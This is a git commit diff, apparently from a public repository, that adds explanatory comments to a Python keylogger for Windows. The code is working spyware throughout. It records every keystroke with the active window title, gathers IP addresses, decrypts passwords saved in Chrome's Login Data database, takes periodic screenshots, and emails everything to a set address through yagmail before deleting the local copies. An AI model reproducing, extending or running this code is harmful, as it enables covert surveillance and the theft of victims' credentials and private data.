ad364f23a77aad4ea548c6ef47a46846d1cb44ec
James-Charles-Robinson <54746146+James-Charles-Robinson@users.noreply.github.com>
2020-04-02 19:51:33 +0100

    added more comments

--- keylogger.py
+++ keylogger.py
@@ -12,7 +12,7 @@ import sqlite3
 import win32crypt
 
 
-def getInfo():
+def getInfo(): # Gets the info of the user
 
     publicIp = requests.get("https://api.ipify.org").text
     privateIp = socket.gethostbyname(socket.gethostname())
@@ -24,17 +24,18 @@ def getInfo():
 
     return info
 
-def on_press(key):
+def on_press(key): # function that runs per keypress
     global oldApp
     global loggedData
 
-    
+    # if the current app changes add that to the log
     app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
     if app != oldApp:
         loggedData.append("\n" + "New App - " + app + "\n")
         oldApp = app
 
+    # format the keypress into a readable format
     key = str(key).strip('\'')
     substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
 	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
@@ -42,12 +43,13 @@ def on_press(key):
 	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
 	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]', 'Key.up', '[UP]']
 
+    # append key to logged data
     if key in substitution:
         loggedData.append(substitution[substitution.index(key)+1])
     else:
         loggedData.append(key)
 
-def saveData():
+def saveData(): # saves keypresses to logfile at regular intervals
     global loggedData
     global logsPath
     
@@ -69,31 +71,42 @@ def saveData():
 
         loggedData = [getInfo()]
 
-def getPasswords():
+def getPasswords(): # gets the passwords saved by google
     global logsPath
     dBPath = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+	
     while True:
+		# connects to the sql database containing passwords
         connection = sqlite3.connect(dBPath)
         cursor = connection.cursor()
         statement = "SELECT origin_url,username_value,password_value FROM logins"
         accounts = []
+	
         try:
+	    	# executes statement to get data
             cursor.execute(statement)
             data=cursor.fetchall()
+		
             for url, username, password in data:
                 try:
+		    		# decrypts password into readable format
                     password = win32crypt.CryptUnprotectData(password)
                     acc = str(url) + ", " + str(username) + ", " + str(password[1].decode("utf-8") + "\n")
                     accounts.append(acc)        
-                except Exception as e: pass # Error 87, wrong encryption
-        except sqlite3.OperationalError: pass # print("Google is open")
+                except Exception as e: pass # Error 87, wrong encryption method
+		
+        except sqlite3.OperationalError: pass # Error, google is open
+	
         file = logsPath + "passwords.txt"
+	
+		# save passwords
         with open(file, "w+") as f:
             for account in accounts:
                 f.write(account)
+		
         time.sleep(1200)
 
-def takeScreenShot():
+def takeScreenShot(): #takes screenshots of the main screen
     global logsPath
     count = 0
 
@@ -107,7 +120,7 @@ def takeScreenShot():
             time.sleep(120)
         except: pass
 
-def sendData():
+def sendData(): # emails all the data using yagmail
     global oldApp
     global logsPath
     global email
@@ -116,11 +129,13 @@ def sendData():
     time.sleep(10)
 
     while True:
+		# add all the saved data to the email as attachments
         attachments = os.listdir(logsPath)
         attachments = [logsPath + x for x in attachments]
         yag.send(email, 'Logs', attachments)
         oldApp = ""
 
+		# remove sent data
         for file in attachments:
             os.remove(file)
         time.sleep(100)
@@ -128,7 +143,7 @@ def sendData():
 oldApp = ""
 loggedData = []
 loggedData.append(getInfo())
-logsPath = os.path.expanduser('~') + "\\logs\\"
+logsPath = os.path.expanduser('~') + "\\logs\\" # dir where logs and ss's are saved
 email = "random@email.com"
 password = "Password123"
 
